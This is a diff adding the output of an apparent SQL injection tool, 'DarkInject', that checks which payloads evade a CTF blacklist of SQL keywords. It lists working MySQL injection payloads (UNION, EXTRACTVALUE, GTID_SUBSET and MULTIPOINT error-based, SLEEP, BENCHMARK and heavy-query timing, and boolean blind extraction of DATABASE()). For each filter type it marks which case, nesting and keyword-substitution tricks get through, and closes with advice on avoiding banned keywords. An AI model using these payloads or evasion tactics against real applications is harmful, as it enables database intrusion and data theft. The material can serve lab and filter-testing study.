@@ -1,0 +1,88 @@
+==============================================================================
+  DarkInject — 黑名单绕过自检
+==============================================================================
+  黑名单: lab/blacklist_ctf.txt
+  被禁 token: 26 个
+  'union', 'sleep', 'benchmark', 'get_lock', 'release_lock', 'extractvalue', 'updatexml', 'load_file', 'outfile', 'dumpfile', ' into ', 'insert', 'update', 'delete', 'drop', 'alter', 'create', 'replace', 'truncate', 'handler', 'procedure', '--', '/*', '*/', '#', ';'
+  [!] 注释符被禁 → payload 需为无注释形式
+  候选策略: raw, case, lower, nest, nest+blank, alt, nest+alt, charencode
+==============================================================================
+
+▸ 联合(数字型)
+  payload: -1 UNION SELECT 1,2,3
+    ✗ presence(i)  命中即拒  → （该语义下无可用策略）
+    ✓ presence(cs) 命中即拒  → raw, case, alt
+    ✓ strip(单次,i)  删一次   → nest, nest+blank, nest+alt
+    ✓ strip(单次,cs) 删一次   → raw, case, nest, nest+blank, alt, nest+alt
+    ✗ strip(递归,i)  删到干净  → （该语义下无可用策略）
+
+▸ 联合(字符型)
+  payload: -1' UNION SELECT 1,2,3 AND '1'='1
+    ✗ presence(i)  命中即拒  → （该语义下无可用策略）
+    ✓ presence(cs) 命中即拒  → raw
+    ✓ strip(单次,i)  删一次   → nest, nest+blank
+    ✓ strip(单次,cs) 删一次   → raw, case, nest, nest+blank
+    ✗ strip(递归,i)  删到干净  → （该语义下无可用策略）
+
+▸ 报错(extractvalue)
+  payload: 1 AND (EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e)))
+    ✗ presence(i)  命中即拒  → （该语义下无可用策略）
+    ✓ presence(cs) 命中即拒  → raw, case
+    ✓ strip(单次,i)  删一次   → nest, nest+blank
+    ✓ strip(单次,cs) 删一次   → raw, case, nest, nest+blank
+    ✗ strip(递归,i)  删到干净  → （该语义下无可用策略）
+
+▸ 报错(GTID_SUBSET)
+  payload: 1 AND (GTID_SUBSET(CONCAT(0x7e,(SELECT DATABASE()),0x7e),1))
+    ✓ presence(i)  命中即拒  → raw, case, lower, nest, nest+blank
+    ✓ presence(cs) 命中即拒  → raw, case, lower, nest, nest+blank
+    ✓ strip(单次,i)  删一次   → raw, case, lower, nest, nest+blank
+    ✓ strip(单次,cs) 删一次   → raw, case, lower, nest, nest+blank
+    ✓ strip(递归,i)  删到干净  → raw, case, lower, nest, nest+blank
+
+▸ 报错(几何函数)
+  payload: 1 AND (MULTIPOINT((SELECT DATABASE())))
+    ✓ presence(i)  命中即拒  → raw, case, lower, nest, nest+blank
+    ✓ presence(cs) 命中即拒  → raw, case, lower, nest, nest+blank
+    ✓ strip(单次,i)  删一次   → raw, case, lower, nest, nest+blank
+    ✓ strip(单次,cs) 删一次   → raw, case, lower, nest, nest+blank
+    ✓ strip(递归,i)  删到干净  → raw, case, lower, nest, nest+blank
+
+▸ 时间(SLEEP)
+  payload: 1 AND IF((ASCII(SUBSTR((SELECT DATABASE()),1,1))>=114),SLEEP(3),0)
+    ✗ presence(i)  命中即拒  → （该语义下无可用策略）
+    ✓ presence(cs) 命中即拒  → raw, case
+    ✓ strip(单次,i)  删一次   → nest, nest+blank
+    ✓ strip(单次,cs) 删一次   → raw, case, nest, nest+blank
+    ✗ strip(递归,i)  删到干净  → （该语义下无可用策略）
+
+▸ 时间(BENCHMARK)
+  payload: 1 AND IF((ASCII(SUBSTR((SELECT DATABASE()),1,1))>=114),BENCHMARK(10000000,MD5(1)),0)
+    ✗ presence(i)  命中即拒  → （该语义下无可用策略）
+    ✓ presence(cs) 命中即拒  → raw, case
+    ✓ strip(单次,i)  删一次   → nest, nest+blank
+    ✓ strip(单次,cs) 删一次   → raw, case, nest, nest+blank
+    ✗ strip(递归,i)  删到干净  → （该语义下无可用策略）
+
+▸ 时间(重查询)
+  payload: 1 AND IF((1>2),(SELECT COUNT(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C),0)
+    ✓ presence(i)  命中即拒  → raw, case, lower, nest, nest+blank
+    ✓ presence(cs) 命中即拒  → raw, case, lower, nest, nest+blank
+    ✓ strip(单次,i)  删一次   → raw, case, lower, nest, nest+blank
+    ✓ strip(单次,cs) 删一次   → raw, case, lower, nest, nest+blank
+    ✓ strip(递归,i)  删到干净  → raw, case, lower, nest, nest+blank
+
+▸ 布尔盲注
+  payload: 1 AND (ASCII(SUBSTR((SELECT DATABASE()),1,1))>=114)
+    ✓ presence(i)  命中即拒  → raw, case, lower, nest, nest+blank
+    ✓ presence(cs) 命中即拒  → raw, case, lower, nest, nest+blank
+    ✓ strip(单次,i)  删一次   → raw, case, lower, nest, nest+blank
+    ✓ strip(单次,cs) 删一次   → raw, case, lower, nest, nest+blank
+    ✓ strip(递归,i)  删到干净  → raw, case, lower, nest, nest+blank
+
+==============================================================================
+  可绕过组合: 35/45
+  提示: presence(命中即拒) 下，只要 payload 里含任何被禁词就一定被拦，
+        真解法是「换写法避开关键字」（布尔盲注 / 重查询延时 / 非被禁报错函数），
+        而不是指望 tamper 变形。
+==============================================================================
